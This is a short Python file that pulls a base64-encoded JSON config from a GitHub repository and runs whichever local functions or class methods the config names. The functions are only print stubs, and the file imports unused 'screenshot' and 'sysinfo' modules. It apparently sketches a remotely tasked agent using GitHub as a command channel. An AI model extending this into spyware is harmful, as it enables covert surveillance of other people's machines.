import base64
import json
import requests
from typing import Dict
from screenshot import screenshot
from sysinfo import sysinfo
from dotenv import load_dotenv
import os

load_dotenv()

#Vars
REPO = os.getenv("repo")
CONFIG_FILE = os.getenv("config-file")

#Test functions:
class t():
    def f1(self):
        print('1')
def f64():
    print('64')
def f01():
    print('120')

def fetch_config(repo_url: str, config_file: str) -> Dict:
    #Fetches the config file from a GitHub repository and returns its contents as a dictionary.
    api_url = f"https://api.github.com/repos/{repo_url}/contents/{config_file}"
    response = requests.get(api_url)
    response.raise_for_status()
    content = response.json()["content"]
    decoded_content = base64.b64decode(content).decode("utf-8")
    return json.loads(decoded_content)

def run_functions(repo_url: str, config_file: str):
    #Fetches the config file from a GitHub repository and executes the functions listed in the file.
    config = fetch_config(repo_url, config_file)
    for function_name in config:
        if '.' in function_name:
            class_name, method_name = function_name.split('.')
            cls = globals()[class_name]()
            method = getattr(cls, method_name)
            method()
        else:
            globals()[function_name]()

